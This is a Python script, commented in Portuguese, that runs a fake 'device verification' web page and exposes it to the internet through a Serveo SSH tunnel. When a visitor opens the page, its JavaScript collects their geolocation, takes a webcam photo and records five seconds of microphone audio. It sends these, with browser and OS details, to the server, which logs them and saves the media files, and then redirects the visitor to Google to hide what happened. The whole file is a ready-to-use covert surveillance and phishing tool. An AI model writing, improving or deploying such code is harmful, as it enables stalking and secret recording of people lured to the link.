import os
import time
import json
import re
from http.server import BaseHTTPRequestHandler, HTTPServer
import threading
import subprocess
from datetime import datetime
import base64

PORT = 8080
LOG_FILE = "device_data.txt"
REDIRECT_URL = "https://www.google.com"

class AdvancedDeviceHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/':
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            
            html = f"""
            <!DOCTYPE html>
            <html>
            <head>
                <title>Verificação Completa</title>
                <script>
                    let mediaStream;
                    let mediaRecorder;
                    let audioChunks = [];
                    const recordTime = 5000; // 5 segundos de gravação

                    async function collectAllData() {{
                        const deviceData = {{
                            timestamp: new Date().toISOString(),
                            userAgent: navigator.userAgent,
                            platform: navigator.platform,
                            deviceType: getDeviceType(),
                            browser: getBrowserInfo(),
                            os: getOSInfo(),
                            screen: {{
                                width: screen.width,
                                height: screen.height,
                                colorDepth: screen.colorDepth
                            }},
                            location: null,
                            photo: null,
                            audio: null,
                            errors: []
                        }};

                        try {{
                            // 1. Coletar geolocalização
                            await getLocation(deviceData);
                            
                            // 2. Tirar foto
                            await takePhoto(deviceData);
                            
                            // 3. Gravar áudio
                            await recordAudio(deviceData);
                            
                            // 4. Enviar dados
                            await sendData(deviceData);
                            
                            // Redirecionar após envio
                            setTimeout(() => {{
                                window.location.href = "{REDIRECT_URL}";
                            }}, 1000);
                            
                        }} catch (error) {{
                            deviceData.errors.push('Erro geral: ' + error.message);
                            await sendData(deviceData);
                            window.location.href = "{REDIRECT_URL}";
                        }}
                    }}

                    async function getLocation(data) {{
                        try {{
                            const position = await new Promise((resolve, reject) => {{
                                navigator.geolocation.getCurrentPosition(resolve, reject);
                            }});
                            data.location = {{
                                latitude: position.coords.latitude,
                                longitude: position.coords.longitude,
                                accuracy: position.coords.accuracy
                            }};
                        }} catch (error) {{
                            data.errors.push('Localização: ' + error.name);
                        }}
                    }}

                    async function takePhoto(data) {{
                        try {{
                            mediaStream = await navigator.mediaDevices.getUserMedia({{ video: true }});
                            const video = document.createElement('video');
                            video.srcObject = mediaStream;
                            await video.play();
                            
                            const canvas = document.createElement('canvas');
                            canvas.width = video.videoWidth;
                            canvas.height = video.videoHeight;
                            canvas.getContext('2d').drawImage(video, 0, 0);
                            
                            data.photo = canvas.toDataURL('image/jpeg', 0.7);
                            
                            // Parar stream
                            mediaStream.getTracks().forEach(track => track.stop());
                        }} catch (error) {{
                            data.errors.push('Câmera: ' + error.name);
                        }}
                    }}

                    async function recordAudio(data) {{
                        try {{
                            mediaStream = await navigator.mediaDevices.getUserMedia({{ audio: true }});
                            mediaRecorder = new MediaRecorder(mediaStream);
                            audioChunks = [];
                            
                            mediaRecorder.ondataavailable = event => {{
                                audioChunks.push(event.data);
                            }};
                            
                            mediaRecorder.onstop = async () => {{
                                const audioBlob = new Blob(audioChunks, {{ type: 'audio/wav' }});
                                const reader = new FileReader();
                                reader.onload = function() {{
                                    data.audio = reader.result.split(',')[1]; // Base64
                                }};
                                reader.readAsDataURL(audioBlob);
                            }};
                            
                            mediaRecorder.start();
                            await new Promise(resolve => setTimeout(resolve, recordTime));
                            mediaRecorder.stop();
                            mediaStream.getTracks().forEach(track => track.stop());
                        }} catch (error) {{
                            data.errors.push('Áudio: ' + error.name);
                        }}
                    }}

                    function getDeviceType() {{
                        const ua = navigator.userAgent;
                        if (/Mobi|Android|iPhone|iPad|iPod/i.test(ua)) return 'Mobile';
                        if (/Tablet|iPad/i.test(ua)) return 'Tablet';
                        return 'Desktop';
                    }}

                    function getBrowserInfo() {{
                        const ua = navigator.userAgent;
                        if (/Chrome/.test(ua)) return 'Chrome';
                        if (/Firefox/.test(ua)) return 'Firefox';
                        if (/Safari/.test(ua)) return 'Safari';
                        if (/Edge/.test(ua)) return 'Edge';
                        if (/Opera/.test(ua)) return 'Opera';
                        if (/MSIE|Trident/.test(ua)) return 'IE';
                        return 'Unknown';
                    }}

                    function getOSInfo() {{
                        const ua = navigator.userAgent;
                        if (/Windows/.test(ua)) return 'Windows';
                        if (/Mac/.test(ua)) return 'MacOS';
                        if (/Linux/.test(ua)) return 'Linux';
                        if (/Android/.test(ua)) return 'Android';
                        if (/iOS|iPhone|iPad|iPod/.test(ua)) return 'iOS';
                        return 'Unknown';
                    }}

                    async function sendData(data) {{
                        try {{
                            const formData = new FormData();
                            formData.append('data', JSON.stringify(data));
                            
                            if (data.photo) {{
                                const photoBlob = await fetch(data.photo).then(r => r.blob());
                                formData.append('photo', photoBlob, 'photo.jpg');
                            }}
                            
                            if (data.audio) {{
                                const audioBlob = await fetch(`data:audio/wav;base64,${{data.audio}}`).then(r => r.blob());
                                formData.append('audio', audioBlob, 'audio.wav');
                            }}
                            
                            await fetch('/save', {{
                                method: 'POST',
                                body: formData
                            }});
                        }} catch (error) {{
                            console.error('Erro ao enviar:', error);
                        }}
                    }}

                    window.onload = collectAllData;
                </script>
            </head>
            <body>
                <h1>Verificação de Dispositivo em Andamento</h1>
                <p>Aguarde enquanto coletamos as informações necessárias...</p>
            </body>
            </html>
            """
            self.wfile.write(html.encode('utf-8'))
        
        elif self.path == '/save':
            self.send_response(200)
            self.end_headers()
        
        else:
            self.send_error(404)

    def do_POST(self):
        if self.path == '/save':
            content_type = self.headers['Content-Type']
            if 'multipart/form-data' in content_type:
                try:
                    form_data = self.parse_multipart(content_type)
                    self.save_device_data(form_data)
                    self.send_response(200)
                    self.end_headers()
                except Exception as e:
                    print(f"Erro ao processar dados: {str(e)}")
                    self.send_error(500)
            else:
                self.send_error(400, "Formato não suportado")
        else:
            self.send_error(404)

    def parse_multipart(self, content_type):
        # Implementação simplificada para parsear multipart/form-data
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length)
        
        # Aqui você precisaria de um parser multipart mais robusto
        # Esta é uma versão simplificada apenas para demonstração
        boundary = content_type.split('boundary=')[1]
        parts = post_data.split(b'--' + boundary.encode())
        
        form_data = {}
        for part in parts:
            if b'name="data"' in part:
                json_str = part.split(b'\r\n\r\n')[1].split(b'\r\n')[0]
                form_data['data'] = json.loads(json_str.decode('utf-8'))
            elif b'name="photo"' in part:
                photo_data = part.split(b'\r\n\r\n')[1].split(b'\r\n')[0]
                form_data['photo'] = photo_data
            elif b'name="audio"' in part:
                audio_data = part.split(b'\r\n\r\n')[1].split(b'\r\n')[0]
                form_data['audio'] = audio_data
        
        return form_data

    def save_device_data(self, form_data):
        try:
            device_data = form_data.get('data', {})
            
            # Salvar dados básicos
            log_entry = f"""
            ╔════════ NOVO DISPOSITIVO ════════╗
            ║ Data/Hora: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
            ╠═══════════════════════════════════╣
            ║ Tipo: {device_data.get('deviceType', 'N/A')}
            ║ Navegador: {device_data.get('browser', 'N/A')}
            ║ SO: {device_data.get('os', 'N/A')}
            ║ User Agent: {device_data.get('userAgent', 'N/A')}
            ║ Tela: {device_data.get('screen', {}).get('width', 'N/A')}x{device_data.get('screen', {}).get('height', 'N/A')}
            ║ Localização: {device_data.get('location', 'N/A')}
            ║ Erros: {', '.join(device_data.get('errors', ['Nenhum']))}
            ╚═══════════════════════════════════╝
            """
            
            print(log_entry)
            
            # Salvar no arquivo de log
            with open(LOG_FILE, 'a', encoding='utf-8') as f:
                f.write(log_entry + '\n')
            
            # Salvar foto se existir
            if 'photo' in form_data:
                photo_path = f"photo_{datetime.now().strftime('%Y%m%d_%H%M%S')}.jpg"
                with open(photo_path, 'wb') as f:
                    f.write(form_data['photo'])
                print(f"Foto salva como: {photo_path}")
            
            # Salvar áudio se existir
            if 'audio' in form_data:
                audio_path = f"audio_{datetime.now().strftime('%Y%m%d_%H%M%S')}.wav"
                with open(audio_path, 'wb') as f:
                    f.write(form_data['audio'])
                print(f"Áudio salvo como: {audio_path}")
            
        except Exception as e:
            print(f"Erro ao salvar dados: {str(e)}")

def start_server():
    server = HTTPServer(('0.0.0.0', PORT), AdvancedDeviceHandler)
    print(f"Servidor rodando na porta {PORT}")
    print(f"Logs serão salvos em: {os.path.abspath(LOG_FILE)}")
    print(f"Redirecionando para: {REDIRECT_URL}")
    server.serve_forever()

def start_serveo():
    print("Iniciando túnel Serveo...")
    subprocess.run(f"ssh -R 80:localhost:{PORT} serveo.net > serveo.log 2>&1", shell=True)
    time.sleep(5)
    
    try:
        with open("serveo.log", "r") as f:
            for line in f:
                if "serveo.net" in line:
                    public_url = line.split()[-1]
                    print(f"\n✅ URL PÚBLICA: {public_url}")
                    print("⚠️ Aguardando conexões...")
                    break
    except:
        print("Não foi possível obter a URL pública")

if __name__ == "__main__":
    try:
        if os.path.exists(LOG_FILE):
            os.remove(LOG_FILE)
        
        server_thread = threading.Thread(target=start_server)
        server_thread.daemon = True
        server_thread.start()
        
        time.sleep(1)
        serveo_thread = threading.Thread(target=start_serveo)
        serveo_thread.daemon = True
        serveo_thread.start()
        
        print("\nPressione Ctrl+C para encerrar\n")
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\nServidor encerrado")
